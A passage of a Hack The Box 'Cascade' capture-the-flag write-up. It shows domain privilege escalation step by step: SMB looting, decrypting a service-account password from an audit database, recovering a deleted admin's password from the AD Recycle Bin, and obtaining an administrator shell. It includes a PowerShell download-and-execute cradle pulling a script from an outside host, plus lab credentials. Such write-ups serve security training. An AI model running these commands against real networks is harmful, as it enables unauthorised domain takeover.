SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

#### PrivescCheck

```bash
iex (new-object net.webclient).DownloadString('http://10.10.14.9/pwsh/PrivescCheck.ps1'); Invoke-PrivescCheck
```

![](/assets/obsidian/d3e7d39f935dabe2f53003050ad60b8e.png)

#### Bloodhound

```bash
mkdir -p bloodhound-result && cd bloodhound-result && bloodhound-python -d cascade.local -ns 10.129.45.164 -u 's.smith' -p 'sT333ve2' -c all
sudo neo4j start
```

#### Ad-miner

```bash
AD-miner -c -cf cascade.local -u neo4j -p <PASSWORD>
```

### SMB shares

`s.smith` is in `Audit Share` group, check smb shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ nxc smb cascade.local -u 's.smith' -p 'sT333ve2' --shares
SMB         10.129.45.164   445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.45.164   445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2
SMB         10.129.45.164   445    CASC-DC1         [*] Enumerated shares
SMB         10.129.45.164   445    CASC-DC1         Share           Permissions     Remark
SMB         10.129.45.164   445    CASC-DC1         -----           -----------     ------
SMB         10.129.45.164   445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.129.45.164   445    CASC-DC1         Audit$          READ
SMB         10.129.45.164   445    CASC-DC1         C$                              Default share
SMB         10.129.45.164   445    CASC-DC1         Data            READ
SMB         10.129.45.164   445    CASC-DC1         IPC$                            Remote IPC
SMB         10.129.45.164   445    CASC-DC1         NETLOGON        READ            Logon server share
SMB         10.129.45.164   445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.129.45.164   445    CASC-DC1         SYSVOL          READ            Logon server share
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ folders=('Audit$'); for f in $folders; do mkdir -p loot/smb/$f && smbclient "//cascade.local/$f" -U 's.smith%sT333ve2' -c "lcd loot/smb/$f; mask \"\"; recurse ON; prompt OFF; mget *"; done
getting file \CascAudit.exe of size 13312 as CascAudit.exe (27.3 KiloBytes/sec) (average 27.3 KiloBytes/sec)
getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (31.5 KiloBytes/sec) (average 29.2 KiloBytes/sec)
getting file \RunAudit.bat of size 45 as RunAudit.bat (0.1 KiloBytes/sec) (average 20.2 KiloBytes/sec)
getting file \System.Data.SQLite.dll of size 363520 as System.Data.SQLite.dll (455.1 KiloBytes/sec) (average 188.4 KiloBytes/sec)
getting file \System.Data.SQLite.EF6.dll of size 186880 as System.Data.SQLite.EF6.dll (138.9 KiloBytes/sec) (average 168.9 KiloBytes/sec)
getting file \DB\Audit.db of size 24576 as DB/Audit.db (62.7 KiloBytes/sec) (average 157.9 KiloBytes/sec)
getting file \x64\SQLite.Interop.dll of size 1639936 as x64/SQLite.Interop.dll (1040.6 KiloBytes/sec) (average 416.5 KiloBytes/sec)
getting file \x86\SQLite.Interop.dll of size 1246720 as x86/SQLite.Interop.dll (748.3 KiloBytes/sec) (average 495.0 KiloBytes/sec)
```

### Password from audit program

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ sqlite3 loot/smb/Audit\$/DB/Audit.db
SQLite version 3.44.2 2023-11-24 11:41:44
Enter ".help" for usage hints.
sqlite> .headers on
sqlite> .mode columns
sqlite> .tables
DeletedUserAudit  Ldap              Misc
sqlite> select * from DeletedUserAudit;
Id  Username   Name                                      DistinguishedName
--  ---------  ----------------------------------------  ------------------------------------------------------------
6   test       Test                                      CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Delete
               DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d  d Objects,DC=cascade,DC=local

7   deleted    deleted guy                               CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN
               DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef  =Deleted Objects,DC=cascade,DC=local

9   TempAdmin  TempAdmin                                 CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=D
               DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a  eleted Objects,DC=cascade,DC=local
sqlite> select * from Ldap;
Id  uname   pwd                       domain
--  ------  ------------------------  -------------
1   ArkSvc  BQO5l5Kj9MdErXx6Q6AGOw==  cascade.local
sqlite> select * from Misc;
sqlite>
```

The base64 password seems to be encrypted

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ echo 'BQO5l5Kj9MdErXx6Q6AGOw==' | base64 -d
D|zC; 
```

A `.net` program will load the database

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ cat loot/smb/Audit\$/RunAudit.bat
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"                                                                                                                                                                    
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ file loot/smb/Audit\$/CascAudit.exe
loot/smb/Audit$/CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections

┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ diec -a -d loot/smb/Audit\$/CascAudit.exe
MSDOS
PE32
    Library: .NET(v4.0.30319)[-]
    Compiler: VB.NET(-)[-]
    Linker: Microsoft Linker(80.0)[Console32,console]
```

Use **dnspy** to decompile the program

![](/assets/obsidian/29cd155a617736246cfd24a6d7d18538.png)

The below code will decrypt the password

```csharp
using (SQLiteConnection sqliteConnection = new SQLiteConnection("Data Source=" + MyProject.Application.CommandLineArgs[0] + ";Version=3;"))
{
	string str = string.Empty;
	string password = string.Empty;
	string str2 = string.Empty;
	try
	{
		sqliteConnection.Open();
		using (SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT * FROM LDAP", sqliteConnection))
		{
			using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
			{
				sqliteDataReader.Read();
				str = Conversions.ToString(sqliteDataReader["Uname"]);
				str2 = Conversions.ToString(sqliteDataReader["Domain"]);
				string text = Conversions.ToString(sqliteDataReader["Pwd"]);
				try
				{
					password = Crypto.DecryptString(text, "c4scadek3y654321");
				}
				catch (Exception ex)
				{
					Console.WriteLine("Error decrypting password: " + ex.Message);
					return;
				}
			}
		}
		sqliteConnection.Close();
	}
	catch (Exception ex2)
	{
		Console.WriteLine("Error getting LDAP connection data From database: " + ex2.Message);
		return;
	}
```

Since the Crypto library (`CascCrypto.dll`) seems to be customized, we don't want to decrypt it statically

Set a breakpoint to view decrypted password from local variables

![](/assets/obsidian/5b0b3985b407d1936c4ea7797e6bc567.png)

![](/assets/obsidian/45ba1795ab90a0c7e68364fff848bb88.png)

The password is valid

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ nxc smb cascade.local -u 'ArkSvc' -p 'w3lc0meFr31nd'
SMB         10.129.45.164   445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.45.164   445    CASC-DC1         [+] cascade.local\ArkSvc:w3lc0meFr31nd
```

### AD Recycle Bin

From `ldapdomaindump` result, we know `ArkSvc` have a group `AD Recycle Bin`

With the group permission, I can recover `TempAdmin`'s password from ad recycle bin, as it was mentioned in the email previously discovered

View deleted objects

```bash
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
[...]
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```

Check objects that have `cascadeLegacyPwd` property

```bash
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties cascadeLegacyPwd | ? {$_.cascadeLegacyPwd -ne $null}


cascadeLegacyPwd  : YmFDVDNyMWFOMDBkbGVz
Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
```

Credential is valid

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ nxc smb cascade.local -u Administrator -p 'YmFDVDNyMWFOMDBkbGVz'
SMB         10.129.45.164   445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.45.164   445    CASC-DC1         [-] cascade.local\Administrator:YmFDVDNyMWFOMDBkbGVz STATUS_LOGON_FAILURE

┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d
baCT3r1aN00dles                                                                                                                                                                                                  
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ nxc smb cascade.local -u Administrator -p 'baCT3r1aN00dles'
SMB         10.129.45.164   445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.45.164   445    CASC-DC1         [+] cascade.local\Administrator:baCT3r1aN00dles (Pwn3d!)
```

### Evil-winrm

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ evil-winrm -i cascade.local -u 'administrator' -p 'baCT3r1aN00dles'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
9148d257e6e3563edc4701ac24a0021f
```

# Additional
---
